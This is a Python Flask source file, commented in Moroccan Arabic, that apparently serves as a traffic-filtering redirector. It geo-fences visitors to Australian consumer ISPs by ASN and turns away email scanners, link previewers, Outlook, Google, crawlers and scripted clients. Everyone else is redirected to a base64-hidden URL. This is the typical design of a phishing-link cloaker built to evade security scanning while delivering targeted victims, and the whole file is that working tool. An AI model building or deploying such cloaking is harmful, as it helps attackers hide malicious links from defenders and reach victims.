from flask import Flask, request, redirect, make_response
import base64
import re

app = Flask(__name__)

# List ديال ASNs المسموح لهم (Bigpond/Telstra, iiNet, Optus, Aussie Broadband)
ALLOWED_ASNS = {"1221", "7474", "4804", "4739", "7545", "4764", "18398"}
ALLOWED_COUNTRY = "AU"

# User-Agent patterns ديال البوتات اللي بغينا نمنعو
BOT_SIGNATURES = [
    "bot", "preview", "scan", "crawl", "facebookexternalhit",
    "slackbot", "telegrambot", "email", "outlook", "google",
    "python", "curl", "wget", "requests"
]

def is_bot(user_agent: str) -> bool:
    if not user_agent:
        return True
    user_agent = user_agent.lower()
    return any(bot in user_agent for bot in BOT_SIGNATURES)

@app.before_request
def block_unwanted():
    country = request.headers.get('CF-IPCountry', '')
    asn = request.headers.get('CF-Visitor-ASN', '')  # ممكن ما يكونش دايمًا موجود
    user_agent = request.headers.get('User-Agent', '').lower()

    # GEO check
    if country != ALLOWED_COUNTRY:
        return make_response("Access Denied - Not AU", 403)

    # ASN check
    if asn not in ALLOWED_ASNS:
        return make_response("Access Denied - ISP Not Allowed", 403)

    # Bot check
    if is_bot(user_agent):
        return make_response("Access Denied - Bot detected", 403)

@app.route('/')
def index():
    encoded_url = request.args.get('u')
    if not encoded_url:
        return 'No URL provided!', 400
    try:
        decoded_url = base64.urlsafe_b64decode(encoded_url.encode()).decode()
        # فقط روابط http و https مسموح
        if not re.match(r'^https?://', decoded_url):
            return 'Invalid URL!', 400
        return redirect(decoded_url)
    except Exception as e:
        return f'Error decoding URL: {e}', 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
